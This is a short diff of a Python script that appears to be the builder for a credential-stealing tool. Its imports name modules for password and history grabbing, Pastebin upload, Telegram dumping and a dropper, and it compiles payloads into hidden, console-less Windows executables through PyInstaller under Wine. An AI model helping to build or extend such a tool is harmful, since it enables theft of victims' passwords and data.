@@ -9,13 +9,12 @@ from subprocess import call
 from modules_version2.Moud import buildHis  , buildpass , Files , pastbintestuploading , dump_teatgram , dropprrt
 from modules_version2.Banar_color import ascii_txt
 from modules_version2.Banar_color.ascii_txt import merry , WI , W ,Y, B , M ,Q , G , R , X , Z  ,bl , txt , txt1 , cheeksystem
-from os import system , remove ,name
+from os import system , remove ,name,path
 from shutil import rmtree
 from sys import exit
 try:
 	system("cls")
 	merry()
-	#cheeksystem()
 except Exception as e:
 	print(e)
 class Run:
@@ -140,7 +139,7 @@ class Run:
 		self.choose()
 	def CompilinG_Linux(self):
 		self.pyinstaller_path = os.path.expanduser('~/.wine/drive_c/users/root/AppData/Local/Programs/Python/Python38-32/Scripts/pyinstaller.exe')
-		compile_command = ["wine", self.pyinstaller_path, "--onefile", "--noconsole", self.filenampack]
+		compile_command = ["wine", self.pyinstaller_path, "--onefile", "--noconsole", self.filenampackeg]
 		call(compile_command)
 		self.rem_ove()
 		system("clear")
@@ -148,7 +147,7 @@ class Run:
 		self.choose()
 	def CompilinG_Linux_icon(self):
 		self.pyinstaller_path = os.path.expanduser('~/.wine/drive_c/users/root/AppData/Local/Programs/Python/Python38-32/Scripts/pyinstaller.exe')
-		compile_command = ["wine", self.pyinstaller_path, "--onefile", "--noconsole" ,"--icon="+str(self.icon), self.filenampack]
+		compile_command = ["wine", self.pyinstaller_path, "--onefile", "--noconsole" ,"--icon="+str(self.icon), self.filenampackeg]
 		call(compile_command)
 		self.rem_ove()
 		system("clear")
